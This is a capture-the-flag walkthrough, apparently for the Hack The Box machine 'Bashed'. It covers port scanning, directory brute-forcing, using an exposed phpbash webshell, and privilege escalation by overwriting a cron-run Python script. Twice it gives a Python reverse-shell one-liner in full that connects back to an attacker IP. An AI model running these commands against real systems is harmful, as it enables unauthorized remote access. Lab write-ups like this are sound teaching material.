# Bashed

## Nmap

```
sudo nmap 10.10.10.68 -p- -sS -sV   

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Over on port 80 the root page directs us to Arrexel's development site which appears to be a blog. The first post mentions a webshell called phpbash.

![](<../../../.gitbook/assets/image (1660).png>)

Following the page we see some further information regarding phpbash with a GitHub link.

![http://10.10.10.68/single.html#](<../../../.gitbook/assets/image (1661).png>)

Running dirsearch.py against the web server with the big.txt wordlists from Seclist. we find the `/dev/` directory.

```
sudo python3 dirsearch.py -u http://10.10.10.68 -w /usr/share/seclists/Discovery/Web-Content/big.txt --full-url -t 75
```

![](<../../../.gitbook/assets/image (1662).png>)

Browsing to the directory we see an index page containing the phpbash.php shell mentioned earlier.

![http://10.10.10.68/dev/](<../../../.gitbook/assets/image (1663).png>)

Clicking on the phpbash.php takes us to the webshell.

![](<../../../.gitbook/assets/image (1664).png>)

Next, ideally we will get a proper reverse shell. I checked if python was installed with `which python` command and this was confirmed as being installed.

![](<../../../.gitbook/assets/image (1666) (1).png>)

I then set a `netcat` listener on my attacking machine and then executed the command below into the webshell.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.29",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![](<../../../.gitbook/assets/image (1667).png>)

From here checking `sudo -l` for `sudo` permissions shows that we can run all commands as the user 'scriptmanager' without providing a password.

![](<../../../.gitbook/assets/image (1668).png>)

As such running the command below will spawn us a bash shell as the user scriptmanager.

```
sudo -u scriptmanager /bin/bash
```

![](<../../../.gitbook/assets/image (1669).png>)

From here I noticed the non default 'scripts' folder in '/'.

![](<../../../.gitbook/assets/image (1670) (1).png>)

Which contains two files; test.py and test.txt

![](<../../../.gitbook/assets/image (1671).png>)

When viewing the contents it looks like when test.py is executed it created a test.txt file and writes the contents 'testing 123!' to the file

![](<../../../.gitbook/assets/image (1672).png>)

Providing this is executed with elevated privileges we insert a python reverse shell into test.py as we are the owner of the file. I uploaded pspy64 to the target system to check if these are being executed by a cronjob.

After uploading the binary and setting the correct executable permissions I executed pspy64 and was presented with the following:

![](<../../../.gitbook/assets/image (1674).png>)

We see that a process is being executed on a regular interval that is executed any file ending in .py. Because we are the owner of test.py I will simply echo out the contents and replace with a python reverse shell.

```
echo  > test.py
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.29",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' > test.py
```

I then set a listener to port 53 on my attacking machine and soon after caught a root shell.

![](<../../../.gitbook/assets/image (1675).png>)
